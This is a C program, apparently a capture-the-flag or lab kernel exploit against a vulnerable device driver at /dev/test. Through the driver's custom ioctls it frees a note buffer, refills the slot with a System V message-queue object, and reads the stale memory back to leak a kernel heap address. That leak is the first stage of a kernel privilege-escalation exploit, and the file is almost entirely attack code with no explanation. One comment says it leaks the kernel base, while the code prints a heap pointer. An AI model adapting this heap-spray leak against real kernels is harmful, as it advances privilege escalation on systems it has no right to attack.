#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <string.h>
#include <sys/timerfd.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/prctl.h>

int fd;
struct {
  int size;
  char *note;
} cmd;
int new(int size) {
  cmd.size = size; cmd.note = NULL;
  return ioctl(fd, 0xdead0001, &cmd);
}
int delete(void) {
  cmd.size = 0; cmd.note = NULL;
  return ioctl(fd, 0xdead0002, &cmd);
}
int store(int size, void *note) {
  cmd.size = size; cmd.note = note;
  return ioctl(fd, 0xdead0003, &cmd);
}
int load(int size, void *note) {
  cmd.size = size; cmd.note = note;
  return ioctl(fd, 0xdead0004, &cmd);
}

void stop(void) {
  puts("Press enter to continue...");
  getchar();
}

int main() {
  unsigned long buf[0x200];
  memset(buf, 0, 0x1000);

  fd = open("/dev/test", O_RDWR);
  if (fd < 0) {
    perror("/dev/test");
    return 1;
  }

  new(0x50);
  delete();

  /* leak kbase */
  int qid;
  if ((qid = msgget(123, 0666|IPC_CREAT)) == -1) {
    perror("msgget");
    return 1;
  }
  struct {
    long mtype;
    char mtext[0x50 - 0x30];
  } msgbuf;
  msgbuf.mtype = 1;
  strcpy(msgbuf.mtext, "AAAABBBBCCCCDDDDEEEEFFFFF");
  if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext), 0) == -1) {
    perror("msgsnd");
    return 1;
  }
  load(0x50, (void*)buf);
  for(int i = 0; i < 10; i++) {
    printf("0x%04x: 0x%016lx\n", i * 8, buf[i]);
  }
  unsigned long kheap = buf[1];
  printf("[+] kheap = 0x%016lx\n", kheap);

  return 0;
}

